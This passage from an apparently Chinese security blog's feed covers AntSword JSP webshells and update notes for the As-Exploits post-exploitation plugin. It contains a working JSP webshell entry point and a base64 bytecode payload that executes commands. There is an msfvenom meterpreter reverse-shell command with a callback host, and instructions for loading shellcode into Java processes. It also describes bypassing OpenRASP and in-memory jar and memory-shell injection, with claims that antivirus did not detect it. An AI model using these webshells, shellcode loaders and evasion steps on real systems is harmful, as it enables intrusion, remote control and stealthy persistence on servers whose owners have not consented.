classBytes.length</span><br><span class="line">  );</span><br><span class="line">  return cc.getConstructor(java.lang.String.class).newInstance(cmd);</span><br><span class="line">&#125;</span><br><span class="line">output.append(</span><br><span class="line">  define(</span><br><span class="line">    &quot;yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==&quot;,</span><br><span class="line">    &quot;calc&quot;</span><br><span class="line">  )</span><br><span class="line">);</span><br><span class="line">response.getWriter().print(output);</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121869548-0359a60d-9ba2-4e04-880e-8c216374baed.png" alt="image.png"></p><p>也就是说，新型一句话在特殊情况下，还可以继续兼容原有的字节码一句话，甚至复用原有的Payload。</p><h2 id="测试">测试</h2><p>测试环境：Java&gt;=6</p><p>同样的列目录Payload，原有的字节码方式数据包长度为7378，而新型JSP一句话仅仅为2481，差不多为原有的三分之一。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122101963-98b2efc3-85ac-4ec9-b653-6c353cc121eb.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122112355-e2d1a139-3ba3-481b-b73e-58aa8b1e49d3.png" alt="image.png"></p><p>列目录</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122017384-2c0da9c3-b0ef-4cfe-8ac4-aa8cd0b39732.png" alt="image.png"></p><p>中文测试</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121998569-7a3c990d-a9ed-4bc4-bd71-474cbc35466a.png" alt="image.png"></p><p>虚拟终端</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122045799-5feddd0e-a401-4ee0-ae9c-f43a87542256.png" alt="image.png"></p><p>数据库连接</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122226891-a85b9d65-a470-49ea-b73a-0c5a7e73b8f7.png" alt="image.png"></p><h2 id="最后">最后</h2><p>基于JS引擎的Java一句话体积更小，变化种类更多，使用起来更灵活。范围为Java 6及以上，基本可以满足需求，但是Payload写起来非常麻烦，也不好调试，算是有利有弊。</p><p>提出新型一句话并不是说一定要取代原有的打入字节码的方式，只是在更复杂情况下，可以提供给渗透人员更多的选择。</p><p>项目地址：</p><p><a href="https://github.com/AntSwordProject/antSword/commit/a6efa86f5959204140d73092b010fe0739208385" target="_blank" rel="noopener">https://github.com/AntSwordProject/antSword/commit/a6efa86f5959204140d73092b010fe0739208385</a></p><h3></h3><h3 id="-2"></h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;blockquote&gt;&lt;p&gt;本文首发于先知社区&lt;/p&gt;&lt;/blockquote&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;一直以来，Java一句话木马都是采用打入字节码defineClas
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>As-Exploits v1.3更新</title>
    <link href="https://yzddmr6.com/posts/as-exploits-v13-update/"/>
    <id>https://yzddmr6.com/posts/as-exploits-v13-update/</id>
    <published>2021-05-14T12:50:00.000Z</published>
    <updated>2021-06-18T00:55:42.739Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="更新主要内容">更新主要内容</h2><h3 id="v-1-3-2021-5-14">v 1.3 (2021/5/14)</h3><ul><li><p>equals支持数组传参方式，兼容各种容器</p></li><li><p>jsp新增 ShellCode加载器模块，内置两种分别基于jna跟java agent的shellcode加载方式</p></li><li><p>jsp新增 Bypass OpenRASP 模块，thx@Godzilla</p></li><li><p>JarLoader模块 新增手动上传方式，解决因Tomcat最大POST长度为2m导致无法加载内存Jar的问题</p></li><li><p>reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits</p></li><li><p>冰蝎内存马支持3.7，去除pageContext依赖，兼容Spring等容器</p></li><li><p>各模块兼容JDK5</p></li></ul><p>挑几个重点的说说</p><h2 id="Shell入口参数支持数组形式">Shell入口参数支持数组形式</h2><p>Shell入口参数即下面new Object[]{request,response}的部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]&#123;request,response&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>至于为什么要改这个玩意要从内存马的兼容说起。</p><p>除了由于写法问题而导致的各种乱七八糟的问题以外，连接内存马的一个主要问题是冰蝎在入口处采用了pageContext这个类来获取request response session对象。但是以filter型内存马为例，doFilter中三个参数分别是ServletRequest，ServletResponse，FilterChain，并不存在pageContext这个东西，并且在SpringBoot这种容器里根本没有pageContext这个类。</p><p>于是就有跟多师傅提出了自己的解决办法，大体分为三种：</p><ol><li><p>自己声明一个pageContext类，在里面实现对应的request跟response的getter setter。<a href="https://mp.weixin.qq.com/s/r4cU84fASjflHrp-pE-ybg" target="_blank" rel="noopener">冰蝎改造之不改动客户端=&gt;内存马</a>。</p></li><li><p>改写冰蝎的入口为request+response，不再采用pageContext作为入口。但是弊端就是不能再用equals了，要重新写一个方法用反射调用。<a href="https://xz.aliyun.com/t/7899" target="_blank" rel="noopener">冰蝎改造之适配基于tomcat Filter的无文件webshell</a></p></li><li><p>采用蚁剑原来的Custom模式，把恶意函数直接通过字节码打进去，然后通过方法名调用。不过由于直接编译恶意函数的字节码较大会超过最大长度限制，一般要先写入目标然后配合URLClassLoader才能使用。<a href="https://xz.aliyun.com/t/8202" target="_blank" rel="noopener">使用WebLogic CVE-2020-2883配合Shiro rememberMe反序列化一键注入蚁剑shell</a></p></li></ol><p>以上的这些方法可以是可以，但是不够优雅。</p><p>回想我们最开始的问题，为什么要用pageContext，是为了拿到当前请求的上下文，更精确一点就是输入输出：request,response。request是接收参数，response是回显，两者缺一不可。</p><p>后来自己调试的时候发现在request中本身就包含了当前的response，同样response中也包含了当前的request。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067954640-30c5d253-086e-4c5f-9664-d4f3d58279a9.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067965986-fd696384-0f1f-46be-a812-2fe851ad6c40.png" alt="img"></p><p>当时就想着我shell中传个request，然后在payload里面利用反射把requst里面的response取出来，或者response里面的request取出来不就完事了？</p><p>这样确实可以，在2020年9月4日，勤劳的我一大早就起来写了一波代码，然后发了上去，<a href="https://github.com/AntSwordProject/AntSword-JSP-Template/commit/3408ec21a4361db6772f2680c7be06f4ebf22c10" target="_blank" rel="noopener">commit记录</a>可以证明我没有瞎bb。当时蚁剑算是最早兼容内存马的。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621069223851-7c428578-4014-4856-9656-12ff9c824889.png" alt="img"></p><p>因为Tomcat喜欢用门面模式，所以要反射两层，结果后来发现在WebLogic下用不了了，因为WebLogic不喜欢搞门面模式，只需要反射一层就够了。</p><p>行吧，那我就再加一种情况，在JSP <a href="https://github.com/AntSwordProject/AntSword-JSP-Template/commit/ed2489f54729b30701d4894cbf01d0e7a70bb60b" target="_blank" rel="noopener">V1.4版本</a>又增加了一层反射的情况。</p><p>本来以为没事了，后来又发现在有shiro的情况下打一个servlet内存马进去，这时候去连接内存马需要反射三次？？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616503206581-8e5bc7f0-f93f-47df-84b1-3e80206cea7a.png" alt="img"></p><p>WTF？？？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616503331361-d40d72f7-ed5f-4521-a1ac-c5dd2b2df52d.png" alt="img"></p><p>然后意识到，这种case by case的解决方式是不行的，世界上还有那么多种Web容器中间件，不可能一个一个去调吧。</p><p>所以为了彻底解决这个问题，在520师傅的建议下采用了数组的方式将两者直接传进去，把分析的逻辑放在打内存Shell的时候去做，而不在payload里面去做。</p><p>现在冰蝎跟哥斯拉也都有了相应的机制，思路大体是一样的，感兴趣的小伙伴可以自己研究一下。</p><h2 id="JarLoader模块新增手动上传方式">JarLoader模块新增手动上传方式</h2><h4 id="内存加载">内存加载</h4><p>直接通过HTTP包将Jar打入目标内存，仅需选择本地需要上传的Jar文件即可，期间文件不落地。但是Tomcat默认POST最大上传大小为2M，如果超过了此大小请选择手动上传模式。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067344909-cade8e67-8027-4771-8933-aeba53004124.png" alt="img"></p><h4 id="手动上传">手动上传</h4><p>先手动将Jar上传到目标服务器上，然后通过路径加载。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067350373-df952d78-4c46-4edd-8095-9a14aabfdb99.png" alt="img"></p><h2 id="JSP-ShellCode加载器">JSP ShellCode加载器</h2><p>内置两种加载方式，使用之前请务必认真阅读使用说明，否则可能直接将Java进程打挂。</p><p>需要注意两点：</p><ul><li>使用MSF需要加上<code>PrependMigrate=true PrependMigrateProc=xxxx.exe</code>参数，自动迁移到新的进程，否则会在migrate/exit的时候把Java进程给干掉，导致网站瘫痪。例如：<code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.129 LPORT=8888 PrependMigrate=true PrependMigrateProc=svchost.exe -f hex</code></li><li>JNA方式只需要X86类型的ShellCode即可，而Attach方式需要根据目标Java位数来选择对应的ShellCode。</li></ul><h3 id="JNA方式">JNA方式</h3><p>利用第三方库JNA进行ShellCode的加载。</p><p>适用范围：JDK&gt;=1.5</p><h4 id="正确操作">正确操作</h4><ol><li><p>首先利用Jar加载器将<code>ShellCodeLoader.jar</code>上传到目标服务器目录并加载。</p></li><li><p>使用MSF或者CS生成x86类型的shellcode，并开启监听。</p></li><li><p>在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。</p></li><li><p>点击exploit，等待返回回话。</p></li></ol><h4 id="JNA方式测试">JNA方式测试</h4><p>装了360，火绒，电脑管家</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703761091-757ec1a0-dc22-42a8-8264-90186857e093.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703768557-ead0e8b9-01af-40c1-829f-859f05e3f381.png" alt="img"></p><p>上传插件ext目录下的ShellcodeLoader.jar到目标服务器，然后复制文件路径</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067128068-3e3004d7-9cf1-4997-b352-c06e2cbd8d1b.png" alt="img"></p><p>手动加载到JVM中</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067132501-eb56f724-4191-4014-b940-acc602519116.png" alt="img"></p><p>MSF生成Shellcode</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067117069-28df9a49-30b4-4178-9228-51a948f0e854.png" alt="img"></p><p>选择JNA方式，exploit!</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067139961-3e021c58-560c-4283-b7d9-5379fffb27ed.png" alt="img"></p><p>直接上线，杀软没有拦截</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067110644-490c6992-1f0e-4228-9124-1dd5dfd634d2.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067151696-a2c1fe78-b091-481f-b3d0-48fbd70893fe.png" alt="img"></p><p>关于jna会生成一个临时文件的问题，发现确实会生成一个dll临时文件在Tomcat临时目录下</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620911946718-2055dd24-54a9-4584-b8b7-53872a35f46a.png" alt="img"></p><p>但是扫了一下发现是免杀的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620912026110-a394dfa1-5fe1-46fb-923b-6aec2e55a037.png" alt="img"></p><p>VT检测结果0/68，也就是说落地也问题不大。</p><p>不过可能这篇文章出来之后就没了</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620912118643-c07e2e88-fb6f-415f-ac0e-952724f77c18.png" alt="img"></p><h3 id="Attach">Attach</h3><p>模拟java agent注入过程来实现Shellcode的加载。这个native方法是jdk自带的，并且经过oracle签名的，理论上免杀效果更好。</p><p>适用范围：JDK&gt;=1.6</p><h4 id="正确操作-2">正确操作</h4><ol><li><p>基本信息，exploit，Ctrl+F 搜索 <code>sun.arch.data.model</code>，查看java位数</p></li><li><p>根据java位数生成对应位数的shellcode，并开启监听。</p></li><li><p>在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。</p></li><li><p>点击exploit，等待返回回话。</p></li></ol><h4 id="Attach方式测试">Attach方式测试</h4><p>发现是64位java</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067200409-961948c8-5bf7-456e-95f5-fc83fdd14654.png" alt="img"></p><p>CS生成对应位数的shellcode，选择java格式导出。</p><p>粘贴到插件中，在exploit的一刻会自动格式化为hex</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703807468-151e070f-b07a-4abf-8ff2-dbad3d0a3a3d.png" alt="img"></p><p>直接上线，杀软没有拦截。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1620703830068-f753a8b6-57c0-4990-bc83-cd24fb7b3d75.png" alt="img"></p><h2 id="一键Bypass-OpenRASP">一键Bypass OpenRASP</h2><p>借鉴自哥斯拉的插件：<a href="https://github.com/BeichenDream/Godzilla-Plugin-Store/blob/master/Godzilla-BypassOpenRasp.jar" target="_blank" rel="noopener">Godzilla-BypassOpenRasp</a></p><p>一键绕过OpenRASP</p><p>目标安装有OpenRASP且开启命令执行拦截</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067294376-d189243e-dd63-4feb-a291-7b384cd55aeb.png" alt="img"></p><p>exploit!</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067289062-8d172156-075b-4f43-a06a-8b30fd7f0bef.png" alt="img"></p><p>再次运行，即可执行命令</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1621067283390-eeef6d4e-f632-40d0-ad5a-fbb717044e06.png" alt="img"></p><h2 id="其他">其他</h2><ul><li><p>reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits</p></li><li><p>冰蝎内存马去除pageContext依赖，兼容Spring等容器</p></li><li><p>各模块兼容JDK5</p></li></ul><h2 id="项目地址">项目地址</h2><p><a href="https://github.com/yzddmr6/As-Exploits" target="_blank" rel="noopener">https://github.com/yzddmr6/As-Exploits</a></p><p>来颗star吧~</p>]]></content>
    
    <summary type="html">
    
      As-Exploits v1.3更新
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>ClassLoader的理解</title>
    <link href="https://yzddmr6.com/posts/ClassLoader%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://yzddmr6.com/posts/ClassLoader的理解/</id>
    <published>2021-04-30T01:55:00.000Z</published>
    <updated>2021-06-20T01:57:45.581Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>As-Exploits v1.2更新</title>
    <link href="https://yzddmr6.com/posts/as-exploits-v12-update/"/>
    <id>https://yzddmr6.com/posts/as-exploits-v12-update/</id>
    <published>2021-03-26T13:45:48.000Z</published>
    <updated>2021-06-17T15:12:03.386Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>As-Exploits，中国蚁剑后渗透模块。</p><p>目前插件的定位是蚁剑的一个微内核拓展模块，可以迅速做到payload的工程化，不用过多时间浪费在插件的结构上。目前的As-Exlpoits各部分之间基本做到了解耦，新增一个payload只需要两步：1.填写payload，2. 画一个表单。其余发包，回显处理等事情框架会自动帮你实现。想要自定义的话只需要继承父类然后重写对应方法即可。</p><p>其中Payload部分很多借鉴了<a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">冰蝎</a>跟<a href="https://github.com/BeichenDream/Godzilla" target="_blank" rel="noopener">哥斯拉</a>的实现，向其开发者们表示感谢！</p><h2 id="支持列表">支持列表</h2><table><thead><tr><th>模块名称\Shell类型</th><th>PHP</th><th>ASPX</th><th>JSP</th></tr></thead><tbody><tr><td>基本信息</td><td>√</td><td>√</td><td>√</td></tr><tr><td>反弹Shell</td><td>√</td><td>√</td><td>√</td></tr><tr><td>内存马</td><td></td><td></td><td>√</td></tr><tr><td>内存马管理</td><td></td><td></td><td>√</td></tr><tr><td>杀软识别</td><td>√</td><td>√</td><td>√</td></tr><tr><td>提权辅助</td><td>√</td><td>√</td><td>√</td></tr><tr><td>屏幕截图</td><td></td><td>√</td><td>√</td></tr><tr><td>ShellCode加载器</td><td></td><td>√</td><td></td></tr><tr><td>Jar加载器</td><td></td><td></td><td>√</td></tr></tbody></table><h2 id="本次更新主要内容">本次更新主要内容</h2><h3 id="aspx增加屏幕截图模块">aspx增加<code>屏幕截图</code>模块</h3><p>我打我自己</p><p>当然实战中需要较高权限。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616755405537-7a1f6d47-412e-4505-89a5-6ae415bdc2e2.png" alt="img"></p><p>因为在<a href="https://yzddmr6.tk/posts/jscript-load-csharp-assembly/" target="_blank" rel="noopener">Jscript加载Assembly踩坑记</a>里面解决了Jscript加载c#的问题，所以C#的payload理论上都可以加进去，更多其他的用法就看大家自己发挥了</p><h3 id="jsp增加Jar加载器模块">jsp增加<code>Jar加载器</code>模块</h3><p>打一个jar进去通常有两个用处：</p><p>一是可以用来上传数据库驱动。</p><p>二是把恶意类打入JVM中，后续只需要通过反射调用即可。哥斯拉的实现方式就是第一次就把所有的payload打入jvm中，后续通过反射调用。所以后续通信的流量包都非常的小，只需要传递参数即可。</p><p>冰蝎跟哥斯拉都有类似的功能，研究了一下他们的实现。</p><h4 id="冰蝎">冰蝎</h4><p>冰蝎的加载jar功能内嵌于数据库连接部分，仅用于上传数据库驱动。首先把要打入的jdbc上传到目标的临时目录，然后再用URLClassLoader去加载，这里贴一下代码。</p><p>net.rebeyond.behinder.ui.controller.DatabaseViewController#loadDriver</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">private void loadDriver(String scriptType, String databaseType) throws Exception &#123;</span><br><span class="line">    String driverPath = &quot;net/rebeyond/behinder/resource/driver/&quot;;</span><br><span class="line">    Platform.runLater(() -&gt; &#123;</span><br><span class="line">       this.statusLabel.setText(&quot;正在上传数据库驱动……&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">    String os = this.currentShellService.shellEntity.getString(&quot;os&quot;).toLowerCase();</span><br><span class="line">    //根据系统型号选择临时目录</span><br><span class="line">    String remoteDir = os.indexOf(&quot;windows&quot;) &gt;= 0 ? &quot;c:/windows/temp/&quot; : &quot;/tmp/&quot;;</span><br><span class="line">    String libName = null;</span><br><span class="line">    if (scriptType.equals(&quot;jsp&quot;)) &#123; //根据类型选择数据库jdbc</span><br><span class="line">       if (databaseType.equals(&quot;sqlserver&quot;)) &#123;</span><br><span class="line">          libName = &quot;sqljdbc41.jar&quot;;</span><br><span class="line">       &#125; else if (databaseType.equals(&quot;mysql&quot;)) &#123;</span><br><span class="line">          libName = &quot;mysql-connector-java-5.1.36.jar&quot;;</span><br><span class="line">       &#125; else if (databaseType.equals(&quot;oracle&quot;)) &#123;</span><br><span class="line">          libName = &quot;ojdbc5.jar&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125; else if (scriptType.equals(&quot;aspx&quot;)) &#123;</span><br><span class="line">       if (databaseType.equals(&quot;mysql&quot;)) &#123;</span><br><span class="line">          libName = &quot;mysql.data.dll&quot;;</span><br><span class="line">       &#125; else if (databaseType.equals(&quot;oracle&quot;)) &#123;</span><br><span class="line">          libName = &quot;Oracle.ManagedDataAccess.dll&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    byte[] driverFileContent = Utils.getResourceData(driverPath + libName);</span><br><span class="line">    String remotePath = remoteDir + libName;</span><br><span class="line">    //将jar先上传到临时目录</span><br><span class="line">    this.currentShellService.uploadFile(remotePath, driverFileContent, true);</span><br><span class="line">    Platform.runLater(() -&gt; &#123;</span><br><span class="line">       this.statusLabel.setText(&quot;驱动上传成功，正在加载驱动……&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">    //将libPath传递给服务端加载</span><br><span class="line">    JSONObject loadRes = this.currentShellService.loadJar(remotePath);</span><br><span class="line">    if (loadRes.getString(&quot;status&quot;).equals(&quot;fail&quot;)) &#123;</span><br><span class="line">       throw new Exception(&quot;驱动加载失败:&quot; + loadRes.getString(&quot;msg&quot;));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">       Platform.runLater(() -&gt; &#123;</span><br><span class="line">          if (scriptType.equals(&quot;jsp&quot;)) &#123;</span><br><span class="line">             this.statusLabel.setText(&quot;驱动加载成功，请再次点击“连接”。&quot;);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          this.statusLabel.setText(&quot;驱动加载成功。&quot;);</span><br><span class="line">       &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>webshell获取到libPath然后用URLClassLoader去加载。</p><p>net.rebeyond.behinder.payload.java.Loader</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616727060618-8f36b4a4-4ee7-494e-8389-a5c5866c2b4e.png" alt="img"></p><h4 id="哥斯拉">哥斯拉</h4><p>哥斯拉的操作就比较秀了。因为打入一个jar不像打入一个class一样，直接有defineClass方法去接收一个字节数组。据我的研究，没有直接接收一个jar的字节数组的方法。打入jar需要使用URLClassLoader这个类，大概有两种方式，一种是利用http协议，远程获取所要加载的jar。另一种是file协议，从本地路径去读取jar。</p><p>每次都额外搭一个http当然不方便，并且目标还不一定出网。但是file协议的话还需要把jar写到磁盘中，文件就会落地，增加了被发现的风险。</p><p>但是我们回过头想，既然通过file协议加载jar，肯定会有一个通过路径找到文件，然后把文件读取到内存的过程，如果我们能跳过这个根据路径找文件的过程，直接把文件的内容写到字节数组里不就可以文件不落地了吗？</p><p>哥斯拉就是采用的这种做法，利用两个子类分别继承了URLStreamHandler跟URLConnection，然后利用反射模拟了读取文件的过程。</p><p>创建了一种新的协议jarmembuff</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616727986121-7d77c07d-beb5-4e99-b595-487317c1b9d5.png" alt="img"></p><p>然后把收到的jar文件的字节数组给放到变量里。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616728016542-3bfe2933-2cb0-404b-a8c1-5be924aa4c81.png" alt="img"></p><p>这样就实现了文件不落地，将jar打入内存的目的。</p><p>本人在As-Exploits里也采用了这种做法。</p><h4 id="小实验">小实验</h4><p>这里做一个小实验</p><p>写一个弹框测试类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class calc &#123;</span><br><span class="line">    public calc() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jar -cvf打包成jar</p><p>开个web项目，写一个test.jsp如下。去查找calc这个类并且实例化。如果实例化成功则会弹出我们的计算器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    Class.forName(&quot;calc&quot;).newInstance();</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>在第一次访问的时候找不到这个类肯定会报错</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616728798236-5f42d565-f8d2-4207-866a-e0f5918dad1b.png" alt="img"></p><p>然后打开插件，选择要打入的jar文件。这里可以点按钮选择，也可以直接在输入框输入绝对路径。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616731753286-ed814f11-6947-456b-ad71-145227e32aff.png" alt="img"></p><p>exploit！</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616731789889-b2d6e14b-45d2-4bd5-81e8-d4d90a4692a9.png" alt="img"></p><p>再去刷新页面，弹出计算器。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616731810008-50d3ff55-3670-4e1a-8679-97e0eb09ae1b.png" alt="img"></p><h3 id="支持返回包加密">支持返回包加密</h3><p>选择reverse解码器</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616731909173-9573b05d-e744-4b6a-b52a-34978363052d.png" alt="img"></p><p>返回包数据</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616731886710-3008aa92-7e76-4c61-a3d1-6e732b25d638.png" alt="img"></p><h3 id="内存马兼容Spring">内存马兼容Spring</h3><p>其中 内存马管理 以及AntSword类型内存马支持Tomcat（5-9）、Spring</p><p>首先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖pageContext了，相关文章以前也写过，不知道的同学可以翻一翻我的博客：<a href="http://yzddmr6.tk" target="_blank" rel="noopener">yzddmr6.tk</a>。</p><p>这里有两个细节</p><h4 